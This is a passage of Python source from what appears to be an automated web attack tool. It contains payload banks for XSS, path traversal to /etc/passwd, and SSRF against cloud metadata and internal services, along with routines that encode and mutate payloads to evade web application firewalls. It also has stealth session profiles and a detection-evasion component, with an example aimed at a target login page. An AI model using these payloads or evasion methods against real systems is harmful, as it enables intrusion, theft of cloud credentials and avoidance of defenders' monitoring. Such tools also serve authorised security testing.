                "<script>alert(1)</script>",
                '"><script>alert(1)</script>',
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "'><img src=x onerror=alert(1)>",
                "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
            ],
            "lfi": [
                "../../etc/passwd",
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../etc/passwd%00",
                "....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=/etc/passwd",
            ],
            "ssrf": [
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://127.0.0.1:80/",
                "http://localhost/",
                "http://[::1]/",
                "file:///etc/passwd",
                "gopher://127.0.0.1:6379/_INFO",
            ],
        }
        return banks.get(vuln_type, ["' OR '1'='1", "<script>alert(1)</script>"])

    @staticmethod
    def _get_encoded_payload(vuln_type: str, tried: List[str]) -> str:
        """Return an encoded/obfuscated payload for WAF evasion."""
        encodings = [
            lambda p: p.replace("<", "%3c").replace(">", "%3e"),
            lambda p: p.replace("'", "%27").replace(" ", "%20"),
            lambda p: p.replace("'", "\\'").replace(" ", "/**/"),
            lambda p: "".join(f"\\u{ord(c):04x}" if ord(c) > 31 else c for c in p),
        ]
        bank = AdaptiveAttackEngine._get_payload_bank(vuln_type)
        base = next((p for p in bank if p not in tried), bank[0] if bank else "' OR '1'='1")
        encode_fn = random.choice(encodings)
        return encode_fn(base)

    @staticmethod
    def _mutate_payload(payload: str) -> str:
        """Apply minor mutations to an existing payload for bypass attempts."""
        mutations = [
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace("'", "''"),
            lambda p: p.upper(),
            lambda p: p + "-- -",
            lambda p: p.replace("SELECT", "SeLeCt"),
        ]
        return random.choice(mutations)(payload)


# ---------------------------------------------------------------------------
# Convenience factory
# ---------------------------------------------------------------------------


def make_human_session(profile: str = "stealth") -> "HumanLikeAdapter":
    """
    Create a preconfigured human-like session.

    Args:
        profile: One of 'casual', 'aggressive', 'stealth', 'paranoid'.

    Returns:
        A HumanLikeAdapter wrapping a fresh requests.Session.

    Example:
        adapter = make_human_session("stealth")
        response = adapter.get("https://target.com/login")
    """
    from websecure.core.http import hardened_session as _hs
    session = _hs({})
    return HumanLikeAdapter(session, profile=profile)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

__all__ = [
    "TimingProfile",
    "BrowserProfile",
    "BROWSER_PROFILES",
    "BehaviorProfile",
    "CasualProfile",
    "AggressiveProfile",
    "StealthProfile",
    "ParanoidProfile",
    "RequestContextTracker",
    "AdaptiveRateLimiter",
    "DetectionEvader",
    "HumanLikeAdapter",
    "AdaptiveAttackEngine",
    "make_human_session",
]
